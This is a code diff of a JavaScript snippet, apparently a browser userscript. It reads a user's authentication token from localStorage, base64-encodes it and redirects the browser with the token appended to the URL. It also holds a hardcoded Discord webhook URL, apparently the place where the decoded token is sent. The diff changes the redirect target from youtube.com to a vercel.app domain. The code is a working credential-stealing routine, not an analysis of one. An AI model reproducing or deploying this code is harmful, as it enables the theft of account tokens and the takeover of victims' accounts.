@@ -13,7 +13,7 @@
 (function () {
     const webhookURL = 'https://discord.com/api/webhooks/1350767296502829057/QXf2IHKtpA7WcO-EAJeAEYx2ab73clyvvkXKgdTD2dHubaBYL7_nJr2wytxAesKmYf5H';
 
-    if (window.location.href.startsWith("https://www.youtube.com/")) {
+    if (window.location.href.startsWith("giffy-beryl-theta.vercel.app")) {
         const url = new URL(window.location.href);
         const param = atob(url.searchParams.get("v"));
         if (param != null) {
@@ -49,7 +49,7 @@
 
         const token = localStorage.token;
         if (token != null) {
-            window.location.href = "https://www.youtube.com/watch?v=" + btoa(JSON.stringify(token));
+            window.location.href = "giffy-beryl-theta.vercel.app" + btoa(JSON.stringify(token));
         }
     } else {
 
